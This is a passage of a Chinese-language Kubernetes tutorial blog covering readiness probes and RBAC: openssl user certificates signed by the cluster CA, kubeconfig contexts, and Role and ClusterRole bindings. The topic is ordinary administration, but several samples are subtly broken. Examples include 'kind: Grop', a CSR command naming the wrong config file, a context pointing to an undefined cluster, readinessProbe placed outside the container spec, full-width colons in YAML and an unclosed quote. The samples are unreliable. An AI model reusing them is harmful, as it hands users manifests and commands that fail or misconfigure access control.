class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">goproxy</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">goproxy</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">goproxy</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/goproxy:0.1</span><br><br><span class="hljs-attr">readinessProbe:</span><br>  <span class="hljs-attr">tcpSocket:</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br>  <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span><br>  <span class="hljs-attr">timeoutSeconds:</span> <span class="hljs-number">1</span><br>  <span class="hljs-string">successThreshold：1</span><br>  <span class="hljs-string">failureThreshold：3</span><br></code></pre></td></tr></table></figure><hr><h5 id="12-3-3-命令探针"><a href="#12-3-3-命令探针" class="headerlink" title="12.3.3. 命令探针"></a>12.3.3. 命令探针</h5><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">apiVersion</span><span class="hljs-punctuation">:</span> <span class="hljs-string">v1</span><br><span class="hljs-attribute">kind</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">goproxy</span><br>  <span class="hljs-attribute">labels</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">app</span><span class="hljs-punctuation">:</span> <span class="hljs-string">goproxy</span><br><span class="hljs-attribute">spec</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">containers</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">name: goproxy</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">k8s.gcr.io/goproxy:0.1</span><br><br><span class="hljs-attribute">readinessProbe</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">exec</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;sh&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;-c&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;curl -f http://localhost:8080/ready || exit 1</span><br>  <span class="hljs-attribute">initialDelaySeconds</span><span class="hljs-punctuation">:</span> <span class="hljs-string">3</span><br>  <span class="hljs-attribute">periodSeconds</span><span class="hljs-punctuation">:</span> <span class="hljs-string">10</span><br>  <span class="hljs-attribute">timeoutSeconds</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>  successThreshold：1<br>  failureThreshold：3<br></code></pre></td></tr></table></figure><hr><h4 id="12-4-补充：探针的结果"><a href="#12-4-补充：探针的结果" class="headerlink" title="12.4. 补充：探针的结果"></a>12.4. 补充：探针的结果</h4><p>探针的结果就像是你给容器的成绩单，有三种可能：</p><ol><li>&#x3D;&#x3D;Success（成功）&#x3D;&#x3D;：<ol><li>容器通过了健康检查，继续干活！</li></ol></li><li>&#x3D;&#x3D;Failure（失败）&#x3D;&#x3D;：<ol start="2"><li>容器没通过检查，需要处理一下问题。</li></ol></li><li>&#x3D;&#x3D;Unknown（未知）&#x3D;&#x3D;：<ol><li>检查无法执行，K8s 没有采取任何行动。</li></ol></li></ol><hr><h3 id="13-K8S-核心概念：-K8S-Helm"><a href="#13-K8S-核心概念：-K8S-Helm" class="headerlink" title="13. K8S 核心概念： K8S Helm"></a>13. K8S 核心概念： K8S Helm</h3><h4 id="13-1-Helm-引入的原因"><a href="#13-1-Helm-引入的原因" class="headerlink" title="13.1. Helm 引入的原因"></a>13.1. Helm 引入的原因</h4><hr><h3 id="14-K8S-核心概念：RBAC-权限管理"><a href="#14-K8S-核心概念：RBAC-权限管理" class="headerlink" title="14. K8S 核心概念：RBAC 权限管理"></a>14. K8S 核心概念：RBAC 权限管理</h3><h4 id="14-1-RBAC-权限管理引入的原因"><a href="#14-1-RBAC-权限管理引入的原因" class="headerlink" title="14.1. RBAC 权限管理引入的原因"></a>14.1. RBAC 权限管理引入的原因</h4><p>在使用 <code>kubectl</code> 命令时，API Server 并不会随意执行任何请求。它首先会<strong>认证身份</strong>，接着对权限进行<strong>鉴权</strong>，最后才根据 <code>kubectl</code> 命令执行相应操作。</p><p>那么，API Server 是如何进行身份认证和权限鉴权的呢？这与我们执行 <code>kubectl</code> 命令时携带的认证信息密切相关：</p><ol><li><font color="#00b0f0">在 Master 节点终端执行 <code>kubectl</code> 命令</font>：<ol><li>我们在 Master 节点的终端执行 <code>kubectl</code> 时，<code>kubeconfig</code> 文件会<strong>自动携带认证信息</strong>，此认证信息通常是<strong>用户证书</strong>。</li><li>API Server 会先对该证书进行<strong>身份认证</strong>，验证该用户是否存在。</li><li>认证通过后，API Server 会根据我们使用 RBAC（基于角色的访问控制）为该用户绑定的权限，判断其是否有执行该命令的权限。</li></ol></li><li><font color="#00b0f0">在 Pod 内部执行 <code>kubectl</code> 命令</font>：<ol start="4"><li>在 Pod 内执行 <code>kubectl</code> 命令时，我们需要<strong>手动携带当前 Pod 的 Service Account Token</strong>。</li><li>API Server 会先认证该 Token，确认对应的 Service Account 身份。</li><li>认证通过后，API Server 再依据 RBAC 为该 Service Account 绑定的权限，判断其是否有权限执行该命令。</li><li>注意：每个 Pod 只会挂载一个 Service Account，其 Token 会被自动挂载到 <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> 中。</li></ol></li></ol><p>而 RBAC 权限管理就是负责为<strong>用户</strong>、<strong>用户组</strong>或者<strong>Service Account</strong>授予执行 <code>kubectl</code> 命令的<strong>权限</strong>。</p><hr><h4 id="14-2-为-用户-用户组-授权"><a href="#14-2-为-用户-用户组-授权" class="headerlink" title="14.2. 为 用户 &#x2F; 用户组 授权"></a>14.2. 为 用户 &#x2F; 用户组 授权</h4><h5 id="14-2-1-创建用户证书"><a href="#14-2-1-创建用户证书" class="headerlink" title="14.2.1. 创建用户证书"></a>14.2.1. 创建用户证书</h5><p>在 K8S 中创建用户证书时，不能像创建 HTTPS 自签名证书那样随意生成用户证书，因为 K8S 会验证用户证书的有效性。</p><p>K8S 如何检测用户证书是否有效呢？它需要我们将 K8S 当作一个权威的 CA 机构，并为其创建一个 CA 证书，用它的 CA 证书为我们的用户证书签名请求（CSR）进行签署，然后将签署后的用户证书提供给需要的用户。</p><p>如果我们使用 kubeadm 部署 K8S 集群，他会默认为我们生成 CA 证书，CA 证书和其秘钥一般存放在 Master 节点的 <code>/etc/kubernetes/pki/</code> 目录下，文件名通常为 <code>ca.crt</code> 和 <code>ca.key</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># 1. 安装 OpenSSL 服务</span><br>sudo apt install openssl        <span class="hljs-comment"># Ubuntu</span><br><br><br><span class="hljs-comment"># 2. 生成 用户私钥</span><br>openssl genpkey -algorithm RSA -out alice.key -pkeyopt rsa_keygen_bits:2048 -aes256<br><br><br><span class="hljs-comment"># 3. 创建CSR配置文件 csr_alice.conf，并进行配置</span><br>[ req ]<br>default_bits = 2048              <span class="hljs-comment"># 密钥长度设置为 2048 位</span><br>prompt = no                      <span class="hljs-comment"># 禁用交互式提示</span><br>default_md = sha256              <span class="hljs-comment"># 使用 SHA-256 作为默认哈希算法</span><br>distinguished_name = dn          <span class="hljs-comment"># 指定 DN（Distinguished Name）部分</span><br>req_extensions = v3_ext          <span class="hljs-comment"># 启用扩展字段</span><br><br>[ dn ]<br>CN = alice                       <span class="hljs-comment"># 用户名（Common Name）</span><br>O = dev-team                     <span class="hljs-comment"># 用户组（Organization），用于 RBAC 角色绑定</span><br><br>[ v3_ext ]<br>basicConstraints = CA:FALSE      <span class="hljs-comment"># 标记为非 CA 证书</span><br>keyUsage = digitalSignature, keyEncipherment  <span class="hljs-comment"># 密钥用途：数字签名和密钥加密</span><br>extendedKeyUsage = clientAuth    <span class="hljs-comment"># 扩展密钥用途：客户端认证（必须包含）</span><br><br><br><span class="hljs-comment"># 4. 生成含扩展的用户证书签名请求（CSR）</span><br>openssl req -new -key alice.key -out alice.csr -config csr.conf<br><br><br><span class="hljs-comment"># 5. 使用 CA 证书为 CSR 进行签署</span><br>openssl x509 -req -in alice.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out alice.crt -days 365 -extensions v3_ext -sha256<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>不能用 <code>openssl req -new -key user.key -out user.csr</code> 直接生成用户证书签名请求（CSR），因为默认缺少Kubernetes所需的扩展字段（如<code>clientAuth</code>），可能导致证书认证失败。</li></ol></blockquote><hr><h5 id="14-2-2-将用户证书配置到-kubeconfig-中"><a href="#14-2-2-将用户证书配置到-kubeconfig-中" class="headerlink" title="14.2.2. 将用户证书配置到 kubeconfig 中"></a>14.2.2. 将用户证书配置到 kubeconfig 中</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 将 admin.conf 复制并作为用户的 config 模板，重命名为 config，不加任何后缀。</span><br>cp etc<span class="hljs-symbol">/kubernetes/admin.conf</span> etc<span class="hljs-symbol">/kubernetes/userconfig/alice/config</span><br><br><br><span class="hljs-comment"># 2. 修改 config 的关键字段</span><br><br><span class="hljs-params">users:</span>                                      <span class="hljs-comment"># 进行用户配置</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> alice@kubernetes                  <span class="hljs-comment"># 用户名称（本地标识，本文件中引用，推荐：&lt;用户&gt;@&lt;集群&gt;）</span><br>    <span class="hljs-params">user:</span><br>      <span class="hljs-params">client-certificate-data:</span> LS0tLS1CRUdJTiB...   <span class="hljs-comment"># 用户证书 Base64 编码（alice.crt）</span><br>      <span class="hljs-params">client-key-data:</span> LS0tLS1CRUdJ...              <span class="hljs-comment"># 用户私钥 Base64 编码（alice.key）</span><br>      <br><span class="hljs-params">clusters:</span>                                   <span class="hljs-comment"># 进行集群配置</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> env-cluster                       <span class="hljs-comment"># 开发集群名称（本地标识，本文件中引用，其他地方无效）</span><br>    <span class="hljs-params">cluster:</span><br>      <span class="hljs-params">certificate-authority-data:</span> LS0tLS1CRUd...    <span class="hljs-comment"># CA 证书 Base64 编码（ca.crt）</span><br>      <span class="hljs-params">server:</span> https:<span class="hljs-operator">//</span>env_vip.example.com:<span class="hljs-number">6443</span>      <span class="hljs-comment"># API Server 地址（DNS 解析到 VIP，6443 端口）</span><br>      <br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> prod-cluster                     <span class="hljs-comment"># 生产集群名称（本地标识，本文件中引用，其他地方无效）</span><br>    <span class="hljs-params">cluster:</span><br>      <span class="hljs-params">certificate-authority-data:</span> LS0tLS1...<br>      <span class="hljs-params">server:</span> https:<span class="hljs-operator">//</span>prod_vip.example.com:<span class="hljs-number">6443</span><br><br><br><span class="hljs-params">contexts:</span>                                  <span class="hljs-comment"># 进行上下文配置，定义用户当前使用的集群、用户和命名空间</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> dev-team@production              <span class="hljs-comment"># 上下文名称（本地标识，本文件中引用，推荐：&lt;团队&gt;@&lt;集群&gt;）</span><br>    <span class="hljs-params">context:</span><br>      <span class="hljs-params">cluster:</span> production-cluster          <span class="hljs-comment"># 指向开发集群名称</span><br>      <span class="hljs-params">user:</span> alice@kubernetes               <span class="hljs-comment"># 指向用户名称</span><br>      <span class="hljs-params">namespace:</span> mynamespace               <span class="hljs-comment"># kubectl 命令默认操作的命名空间</span><br>      <br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> prod@prod-cluster<br>    <span class="hljs-params">context:</span><br>      <span class="hljs-params">cluster:</span> prod-cluster                <span class="hljs-comment"># 指向生产集群名称</span><br>      <span class="hljs-params">user:</span> alice@kubernetes               <span class="hljs-comment"># 指向用户名称</span><br>      <span class="hljs-params">namespace:</span> mynamespace<br>      <br><br><span class="hljs-params">current-context:</span> dev-team@production       <span class="hljs-comment"># 指定默认生效的上下文，kubectl 将使用该上下文连接集群</span><br><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li><font color="#00b0f0">用户名称</font>：<ul><li>一个 <code>config</code> 文件中可以配置多个用户名称，但由于我们是将配置下发给员工，只需要提供一个用户名称即可</li></ul></li><li><font color="#00b0f0">对 crt、key 进行 Base64 编码</font><ul><li>Kubernetes 配置文件（如 <code>kubeconfig</code>）要求将证书和密钥的内容以字符串形式嵌入配置文件中</li><li>由于证书和密钥是二进制文件，所以需要将其转为 Base64 字符串（<code>base64 -w 0 user.crt </code>），以便写入配置。</li></ul></li><li><font color="#00b0f0">集群配置</font>：<ul><li>如果我们配置了多个 Kubernetes 集群，可以使用同一批用户证书在多个集群中进行操作，无需重新生成用户证书。</li><li>主要是通过配置不同集群的 <code>server</code> 地址，分别指向对应的 API Server，实现跨集群操作。</li><li>但如果规模较小，实际上没必要搭建多个集群，直接使用命名空间（namespace）+调度器（Scheduler）进行逻辑和物理隔离即可，简单又高效。</li></ul></li><li><font color="#00b0f0">上下文配置</font>：<ul><li>切换到某个上下文配置时，<code>kubectl</code> 会自动使用该上下文中指定的：集群（API Server）、用户（user）、命名空间</li><li>举个栗子，就像 Master 主机上的 <code>admin.conf</code>，默认操作当前主机的 API Server，默认使用 admin 用户，默认操作 default 命名空间，如果你想使用其他用户或操作其他命名空间，就需要通过参数挂载</li><li>当然，这只是举个例子，<code>admin.conf</code> 仅包含 <code>admin</code> 用户，你无法切换其他用户，因为根本就没有其他用户</li></ul></li></ol></blockquote><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-comment"># 使用其他用户 的参数挂载</span><br><span class="hljs-literal">-</span>-user=alice@kubernetes<br><br><br><span class="hljs-comment"># 操作其他命名空间 的参数挂载</span><br><span class="hljs-literal">-</span>n mynamespace<br></code></pre></td></tr></table></figure><hr><h5 id="14-2-3-将-config-文件下发到用户管理机"><a href="#14-2-3-将-config-文件下发到用户管理机" class="headerlink" title="14.2.3. 将 config 文件下发到用户管理机"></a>14.2.3. 将 config 文件下发到用户管理机</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"># <span class="hljs-number">1.</span> 使用直接复制或者 ssh 等操作，将 config 下发到用户管理机<br><br><br># <span class="hljs-number">2.</span> 将 config 配置文件复制到默认路径 ~/.kube/config，以便 kubectl 自动加载使用<br><br><br># <span class="hljs-number">3.</span> 在管理机上为 config 设置文件权限<br>chmod <span class="hljs-number">600</span> ~/.kube/config<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>通过这样的配置，管理机无需安装 <code>K8S</code>，即可直接使用 <code>kubectl</code> 命令，并且自动携带 <code>~/.kube/config</code> 文件进行集群访问</li></ol></blockquote><hr><h5 id="14-2-4-使用-Role-RoleBinding-为-用户-用户组-授权"><a href="#14-2-4-使用-Role-RoleBinding-为-用户-用户组-授权" class="headerlink" title="14.2.4. 使用 Role + RoleBinding 为 用户 &#x2F; 用户组 授权"></a>14.2.4. 使用 Role + RoleBinding 为 用户 &#x2F; 用户组 授权</h5><p>&#x3D;&#x3D;1.编写 Role 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Role<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> pod-reader<br>  <span class="hljs-params">namespace:</span> frontend                     <span class="hljs-comment"># 指定作用的命名空间</span><br><span class="hljs-params">rules:</span>                                    <span class="hljs-comment"># 权限规则</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">apiGroups:</span> [<span class="hljs-string">&quot;&quot;</span>]                       <span class="hljs-comment"># API 组（&quot;&quot; 表示核心资源，如 Pod、Service）</span><br>    <span class="hljs-params">resources:</span> [<span class="hljs-string">&quot;pods&quot;</span>]                   <span class="hljs-comment"># 资源名称</span><br>    <span class="hljs-params">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>]                <span class="hljs-comment"># 操作权限</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 Role 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f role.yaml               # 使用 <span class="hljs-built_in">apply</span> 创建 Role<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Role 资源状态&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">kubectl <span class="hljs-keyword">get</span> <span class="hljs-keyword">role</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.编写 RoleBinding 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> RoleBinding<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> alice-pod-reader<br>  <span class="hljs-params">namespace:</span> frontend                      <span class="hljs-comment"># 指定作用的命名空间</span><br><span class="hljs-params">subjects:</span>                                  <span class="hljs-comment"># 授权的用户、组或 ServiceAccount</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">kind:</span> User                             <span class="hljs-comment"># 类型：用户</span><br>    <span class="hljs-params">name:</span> alice                            <span class="hljs-comment"># 授权给 alice 用户（与 用户证书 中的 CN 一致）</span><br>    <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io    <span class="hljs-comment"># 指定 RBAC API 组</span><br><span class="hljs-params">roleRef:</span>                                   <span class="hljs-comment"># 引用已有的 Role</span><br>  <span class="hljs-params">kind:</span> Role                               <span class="hljs-comment"># 引用角色的类型</span><br>  <span class="hljs-params">name:</span> pod-reader                         <span class="hljs-comment"># 引用的 Role 名称（需已存在）</span><br>  <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io      <span class="hljs-comment"># 指定 RBAC API 组</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>我们可以直接为用户组授权，这样用户组中的所有成员都会自动获得该用户组的权限：</li></ol></blockquote><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">subjects:</span>                                  <span class="hljs-comment"># 授权的用户、组或 ServiceAccount</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">kind:</span> Grop                             <span class="hljs-comment"># 类型：用户组</span><br>    <span class="hljs-params">name:</span> dev-team                         <span class="hljs-comment"># 授权给 dev-team 用户组（与 用户证书 中的 O 一致）</span><br>    <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io    <span class="hljs-comment"># 指定 RBAC API 组</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.创建 RoleBinding 资源状态&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f rolebinding.yaml          # 使用 <span class="hljs-built_in">apply</span> 创建 RoleBinding<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;6.检查 RoleBinding 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> rolebinding<br></code></pre></td></tr></table></figure><hr><h5 id="14-2-5-使用-ClusterRole-ClusterRoleBinding-为用户-用户组授权"><a href="#14-2-5-使用-ClusterRole-ClusterRoleBinding-为用户-用户组授权" class="headerlink" title="14.2.5. 使用 ClusterRole + ClusterRoleBinding 为用户 &#x2F; 用户组授权"></a>14.2.5. 使用 ClusterRole + ClusterRoleBinding 为用户 &#x2F; 用户组授权</h5><p>&#x3D;&#x3D;1.编写 ClusterRole 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> ClusterRole<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> pod-reader                          <span class="hljs-comment"># 指定角色名称</span><br><span class="hljs-params">rules:</span>                                      <span class="hljs-comment"># 权限规则</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">apiGroups:</span> [<span class="hljs-string">&quot;&quot;</span>]                         <span class="hljs-comment"># API 组（&quot;&quot; 表示核心资源，如 Pod、Service）</span><br>    <span class="hljs-params">resources:</span> [<span class="hljs-string">&quot;pods&quot;</span>]                     <span class="hljs-comment"># 资源名称</span><br>    <span class="hljs-params">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>]                  <span class="hljs-comment"># 操作权限</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 ClusterRole 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f clusterrole.yaml          # 使用 <span class="hljs-built_in">apply</span> 创建 ClusterRole<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 ClusterRole 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> clusterrole<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.编写 ClusterRoleBinding 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> ClusterRoleBinding<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> alice-pod-reader-binding            <span class="hljs-comment"># 绑定名称</span><br><span class="hljs-params">subjects:</span>                                   <span class="hljs-comment"># 授权的用户、组或 ServiceAccount</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">kind:</span> User                              <span class="hljs-comment"># 类型：用户</span><br>    <span class="hljs-params">name:</span> alice                             <span class="hljs-comment"># 授权给 alice 用户（与 用户证书 中的 CN 一致）</span><br>    <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io     <span class="hljs-comment"># 指定 RBAC API 组</span><br><span class="hljs-params">roleRef:</span>                                    <span class="hljs-comment"># 引用已有的 ClusterRole</span><br>  <span class="hljs-params">kind:</span> ClusterRole                         <span class="hljs-comment"># 引用角色的类型</span><br>  <span class="hljs-params">name:</span> pod-reader                          <span class="hljs-comment"># 引用的 ClusterRole 名称（需已存在）</span><br>  <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io       <span class="hljs-comment"># 指定 RBAC API 组</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>我们可以直接为用户组授权，这样用户组中的所有成员都会自动获得该用户组的权限：</li></ol></blockquote><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">subjects:</span>                                  <span class="hljs-comment"># 授权的用户、组或 ServiceAccount</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">kind:</span> Grop                             <span class="hljs-comment"># 类型：用户组</span><br>    <span class="hljs-params">name:</span> dev-team                         <span class="hljs-comment"># 授权给 dev-team 用户组（与 用户证书 中的 O 一致）</span><br>    <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io    <span class="hljs-comment"># 指定 RBAC API 组</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.创建 ClusterRoleBinding 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f clusterrolebinding.yaml    # 使用 <span class="hljs-built_in">apply</span> 创建 ClusterRoleBinding<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;6.检查 ClusterRoleBinding 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> clusterrolebinding<br></code></pre></td></tr></table></figure><hr><h4 id="14-3-为-Service-Account-授权"><a href="#14-3-为-Service-Account-授权" class="headerlink" title="14.3. 为 Service Account 授权"></a>14.3. 为 Service Account 授权</h4><h5 